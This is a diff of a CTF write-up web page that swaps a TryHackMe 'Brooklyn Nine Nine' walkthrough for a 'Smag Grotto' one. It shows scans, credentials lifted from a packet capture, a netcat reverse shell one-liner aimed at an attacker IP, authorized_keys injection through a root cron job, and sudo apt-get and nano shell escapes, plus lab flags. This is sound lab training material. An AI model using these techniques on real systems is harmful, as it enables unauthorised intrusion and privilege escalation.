@@ -23,7 +23,7 @@
     
     
       
-        <title>[Brooklyn Nine Nine] - Offense, Defense, and Everything Between</title>
+        <title>Smag Grotto - Offense, Defense, and Everything Between</title>
       
     
     
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#brooklyn-nine-nine" class="md-skip">
+        <a href="#smag-grotto" class="md-skip">
           Skip to content
         </a>
       
@@ -107,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              [Brooklyn Nine Nine]
+              Smag Grotto
             
           </span>
         </div>
@@ -656,17 +656,6 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#ftp-enumeration-anonymous-login" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        FTP enumeration (anonymous login)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#http-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -704,17 +693,6 @@
   
     <nav class="md-nav" aria-label="Foothold">
       <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#image-examination" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Image examination
-      
-    </span>
-  </a>
-  
-</li>
         
           <li class="md-nav__item">
   <a href="#user-flag" class="md-nav__link">
@@ -771,6 +749,13 @@
       
       
       
+        <a href="../../tags/#tag:crontab-abuse" class="md-tag">crontab-abuse</a>
+      
+    
+      
+      
+      
+      
         <a href="../../tags/#tag:easy" class="md-tag">easy</a>
       
     
@@ -792,20 +777,6 @@
       
       
       
-        <a href="../../tags/#tag:steganography" class="md-tag">steganography</a>
-      
-    
-      
-      
-      
-      
-        <a href="../../tags/#tag:sudo-abuse" class="md-tag">sudo-abuse</a>
-      
-    
-      
-      
-      
-      
         <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
       
     
@@ -813,177 +784,179 @@
 
 
 
-<h1 id="brooklyn-nine-nine">[Brooklyn Nine Nine]</h1>
-<p><img alt="Brooklyn Nine Nine logo" src="../logos/brooklyn_nine_nine_logo.png" /></p>
+<h1 id="smag-grotto">Smag Grotto</h1>
+<p><img alt="Smag Grotto logo" src="../logos/smag_grotto_logo.png" /></p>
 <p><strong>Platform:</strong> TryHackMe<br />
 <strong>Type:</strong> Challenge<br />
 <strong>Difficulty:</strong> Easy<br />
-<strong>Link:</strong> <a href="https://tryhackme.com/room/brooklynninenine">Brooklyn Nine Nine</a>  </p>
+<strong>Link:</strong> <a href="https://tryhackme.com/room/smaggrotto">Smag Grotto</a>  </p>
 <h2 id="description">Description</h2>
-<p>"This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box."</p>
+<p>"Follow the yellow brick road.<br />
+Deploy the machine and get root privileges."</p>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="port-scanning">Port scanning</h3>
-<p><div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
 nmap -p$ports -A -T4 TARGET_IP_ADDRESS
 </code></pre></div>
-Open ports:<br />
-<div class="highlight"><pre><span></span><code>Host is up (0.021s latency).
+<div class="highlight"><pre><span></span><code>Host is up (0.019s latency).
 
 PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-| ftp-syst: 
-|   STAT: 
-| FTP server status:
-|      Connected to ::ffff:192.168.130.206
-|      Logged in as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session timeout in seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 4
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-| ftp-anon: Anonymous FTP login allowed (FTP code 230)
-|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
-|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
-|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: Site doesn&#39;t have a title (text/html).
-|_http-server-header: Apache/2.4.29 (Ubuntu)
+|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
+|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
+|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Smag
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose|phone
-Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (96%), Google Android 10.X|11.X|12.X (93%)
-OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6
-Aggressive OS guesses: Linux 4.15 - 5.19 (96%), Linux 4.15 (95%), Linux 5.4 (95%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%), Android 9 - 10 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.7 - 4.19 (92%)
+Aggressive OS guesses: Linux 3.8 - 3.16 (96%), Linux 3.13 (96%), Linux 4.4 (96%), Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 6.0 - 9.0 (Linux 3.18 - 4.4) (92%), Android 7.1.1 - 7.1.2 (92%)
 No exact OS matches for host (test conditions non-ideal).
 Network Distance: 3 hops
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div></p>
-<h3 id="ftp-enumeration-anonymous-login">FTP enumeration (<code>anonymous</code> login)</h3>
-<div class="highlight"><pre><span></span><code>220 (vsFTPd 3.0.3)
-Name (10.129.175.2:kali): anonymous
-331 Please specify the password.
-Password: 
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp&gt; dir
-229 Entering Extended Passive Mode (|||28484|)
-150 Here comes the directory listing.
--rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
-226 Directory send OK.
-ftp&gt; get note_to_jake.txt
-local: note_to_jake.txt remote: note_to_jake.txt
-229 Entering Extended Passive Mode (|||48821|)
-150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
-100% |**********************************************************************************************************************************************************|   119      185.93 KiB/s    00:00 ETA
-226 Transfer complete.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div>
-<div class="highlight"><pre><span></span><code>cat note_to_jake.txt            
-From Amy,
-
-Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
-</code></pre></div>
-<p><strong>Notes</strong>  </p>
-<ul>
-<li>3 potential users ("jake", "amy", "holt")  </li>
-<li>"jake" user tends to choose weak passwords  </li>
-</ul>
 <h3 id="http-enumeration">HTTP enumeration</h3>
 <div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
 gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
 </code></pre></div>
 <p><strong>Notes</strong>  </p>
 <ul>
-<li>No <code>robots.txt</code>  </li>
-<li>No <code>sitemap</code>  </li>
-<li>No useful findings in <code>ffuf</code> or <code>gobuster</code> scans</li>
-<li>Web page = static image  </li>
-<li>Source code comment: "Have you ever heard of steganography?"  </li>
+<li>No <code>robots.txt</code> file  </li>
+<li>No <code>sitemap.xml</code> file  </li>
+<li>Nothing interesting in the source code  </li>
+<li>Only resource found in scans: <code>/mail</code>  </li>
+<li>"email2web" service served on <code>/mail</code> page  </li>
 </ul>
-<p><strong>Action(s)</strong><br />
-<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Download image from web page for further analysis</p>
-<p><em>Image saved as "brooklyn99.jpg"</em></p>
+<p><strong>Action(s)</strong>  </p>
+<p><img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Download <code>.pcap</code> file from <code>/mail</code> directory for further analysis</p>
+<p><em>File saved as sample.pcap</em></p>
 <h3 id="vulnerability-enumeration">Vulnerability enumeration</h3>
-<div class="highlight"><pre><span></span><code>searchsploit vsftpd 3.0.3   # Only result: DoS
-searchsploit OpenSSH 7.6p1  # Only results for username enumeration
-searchsploit httpd 2.4.29   # Only result: DoS
+<div class="highlight"><pre><span></span><code>searchsploit OpenSSH 7.2p2  # Only finding relates to username enumeration
+searchsploit httpd 2.4.18   # Only finding: DoS
 </code></pre></div>
 <h2 id="foothold">Foothold</h2>
-<h3 id="image-examination">Image examination</h3>
-<div class="highlight"><pre><span></span><code>exiftool brooklyn99.jpg             # No findings
-strings brooklyn99.jpg              # No findings
-steghide extract -sf brooklyn99.jpg # Image failed to decompress with blank password
-stegcrack brooklyn99.jpg            # Password found: &quot;admin&quot;
-steghide extract -sf brooklyn99.jpg # File extracted to &quot;note.txt&quot;
-
-cat note.txt        
-    Holts Password:
-    fluffydog12@ninenine
-
-    Enjoy!!
+<div class="highlight"><pre><span></span><code>wireshark sample.pcap
+# Right-click &gt; Follow... &gt; TCP Stream
 </code></pre></div>
+<div class="highlight"><pre><span></span><code>POST /login.php HTTP/1.1
+Host: development.smag.thm
+User-Agent: curl/7.47.0
+Accept: */*
+Content-Length: 39
+Content-Type: application/x-www-form-urlencoded
+
+username=helpdesk&amp;password=cH4nG3M3_n0w
+HTTP/1.1 200 OK
+Date: Wed, 03 Jun 2020 18:04:07 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+</code></pre></div>
+<p><strong>Action(s)</strong>  </p>
+<p><img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Add <code>development.smag.thm</code> + target IP address to <code>/etc/hosts</code><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Navigate to <code>development.smag.thm</code> in web browser<br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Log in to <code>development.smag.thm/login.php</code> with credentials found in <code>.pcap</code> file  </p>
 <p><strong>Notes</strong>  </p>
 <ul>
-<li>SSH password for "holt" user</li>
+<li>After login, redirect to <code>admin.php</code> (POST form to submit commands)  </li>
+<li>Blind - output not returned  </li>
 </ul>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Test connection to attacker machine with test hosted file + <code>Python</code> HTTP server</p>
+<p><strong>Notes</strong>  </p>
+<ul>
+<li>Test POC file can be retrieved</li>
+</ul>
+<p><strong>Actions</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Test reverse shell possibilities from <code>admin.php</code></p>
+<div class="highlight"><pre><span></span><code># On attacker machine
+nc -lvnp 4444
+
+# From admin.php
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2&gt;&amp;1 | nc &lt;ATTACKER_IP_ADDRESS&gt; &lt;LISTENING_PORT&gt; &gt;/tmp/f
+
+# In reverse shell (to stabilise)
+python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre></div>
 <h3 id="user-flag">User flag</h3>
-<div class="highlight"><pre><span></span><code>ssh holt@TARGET_IP_ADDRESS
-# Enter password when prompted
-holt@brookly_nine_nine:~$ ls -al
-total 48
-    drwxr-xr-x 6 holt holt 4096 May 26  2020 .
-    drwxr-xr-x 5 root root 4096 May 18  2020 ..
-    -rw------- 1 holt holt   18 May 26  2020 .bash_history
-    -rw-r--r-- 1 holt holt  220 May 17  2020 .bash_logout
-    -rw-r--r-- 1 holt holt 3771 May 17  2020 .bashrc
-    drwx------ 2 holt holt 4096 May 18  2020 .cache
-    drwx------ 3 holt holt 4096 May 18  2020 .gnupg
-    drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
-    -rw-r--r-- 1 holt holt  807 May 17  2020 .profile
-    drwx------ 2 holt holt 4096 May 18  2020 .ssh
-    -rw------- 1 root root  110 May 18  2020 nano.save
-    -rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
-holt@brookly_nine_nine:~$ cat user.txt
+<div class="highlight"><pre><span></span><code># In reverse shell
+cat /etc/crontab
+    # /etc/crontab: system-wide crontab
+    # Unlike any other crontab you don&#39;t have to run the `crontab&#39;
+    # command to install the new version when you edit this file
+    # and files in /etc/cron.d. These files also have username fields,
+    # that none of the other crontabs do.
+
+    SHELL=/bin/sh
+    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+    # m h dom mon dow user  command
+    17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+    *  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys
+    #
+
+# On attacker machine
+ssh-keygen  # Accept defaults
+cat id_rsa.pub
+
+# In reverse shell
+echo &#39;CONTENTS_OF_ID_RSA.PUB&#39; &gt; /opt/.backups/jake_id_rsa.pub.backup
+
+# On attacker machine
+ssh jake@TARGET_IP_ADDRESS -i id_rsa
+jake@smag:~$ ls -al
+total 60
+    drwxr-xr-x 4 jake jake 4096 Jun  5  2020 .
+    drwxr-xr-x 3 root root 4096 Jun  4  2020 ..
+    -rw------- 1 jake jake  490 Jun  5  2020 .bash_history
+    -rw-r--r-- 1 jake jake  220 Jun  4  2020 .bash_logout
+    -rw-r--r-- 1 jake jake 3771 Jun  4  2020 .bashrc
+    drwx------ 2 jake jake 4096 Jun  4  2020 .cache
+    -rw------- 1 root root   28 Jun  5  2020 .lesshst
+    -rw-r--r-- 1 jake jake  655 Jun  4  2020 .profile
+    -rw-r--r-- 1 root root   75 Jun  4  2020 .selected_editor
+    drwx------ 2 jake jake 4096 Jun  4  2020 .ssh
+    -rw-r--r-- 1 jake jake    0 Jun  4  2020 .sudo_as_admin_successful
+    -rw-rw---- 1 jake jake   33 Jun  4  2020 user.txt
+    -rw------- 1 jake jake 9336 Jun  5  2020 .viminfo
+    -rw-r--r-- 1 root root  167 Jun  5  2020 .wget-hsts
+jake@smag:~$ cat user.txt
 </code></pre></div>
 <details class="success">
-<summary>User flag</summary>
-<p>ee11cbb19052e40b07aac0ca060c23ee</p>
+<summary>What is the user flag?</summary>
+<p>iusGorV7EbmxM5AuIe2w499msaSuqU3j</p>
 </details>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
-<div class="highlight"><pre><span></span><code>sudo -l
-    Matching Defaults entries for holt on brookly_nine_nine:
+<div class="highlight"><pre><span></span><code>jake@smag:~$ sudo -l
+    Matching Defaults entries for jake on smag:
         env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-    User holt may run the following commands on brookly_nine_nine:
-        (ALL) NOPASSWD: /bin/nano
+    User jake may run the following commands on smag:
+        (ALL : ALL) NOPASSWD: /usr/bin/apt-get
 </code></pre></div>
-<p><a href="https://gtfobins.org/gtfobins/nano/">GTFObins <code>nano</code></a></p>
-<div class="highlight"><pre><span></span><code>sudo nano
-^R^X
-reset; sh 1&gt;&amp;0 2&gt;&amp;0
+<p><a href="https://gtfobins.org/gtfobins/apt-get/">GTFObins <code>apt-get</code></a></p>
+<div class="highlight"><pre><span></span><code>jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 ls -al /root
-total 32
-    drwx------  4 root root 4096 May 18  2020 .
-    drwxr-xr-x 24 root root 4096 May 19  2020 ..
-    -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
-    drwxr-xr-x  3 root root 4096 May 17  2020 .local
+    total 28
+    drwx------  3 root root 4096 Jun  4  2020 .
+    drwxr-xr-x 22 root root 4096 Jun  4  2020 ..
+    -rw-------  1 root root    0 Jun  4  2020 .bash_history
+    -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+    drwxr-xr-x  2 root root 4096 Jun  4  2020 .nano
     -rw-r--r--  1 root root  148 Aug 17  2015 .profile
-    drwx------  2 root root 4096 May 18  2020 .ssh
-    -rw-r--r--  1 root root  165 May 17  2020 .wget-hsts
-    -rw-r--r--  1 root root  135 May 18  2020 root.txt
+    -rw-rw----  1 root root   33 Jun  4  2020 root.txt
+    -rw-------  1 root root 1371 Jun  4  2020 .viminfo
 cat /root/root.txt
 </code></pre></div>
 <details class="success">
-<summary>Root flag</summary>
-<p>63a9f0ea7bb98050796b649e85481845</p>
+<summary>What is the root flag?</summary>
+<p>uJr6zRgetaniyHVRqqL58uRasybBKz2T</p>
 </details>
 <p><strong>Tools Used</strong><br />
-<code>stegcrack</code> <code>steghide</code></p>
+<code>Wireshark</code> <code>nc</code> <code>ssh-keygen</code></p>
 <p><strong>Date completed:</strong> 19/04/26<br />
 <strong>Date published:</strong> 19/04/26</p>
 
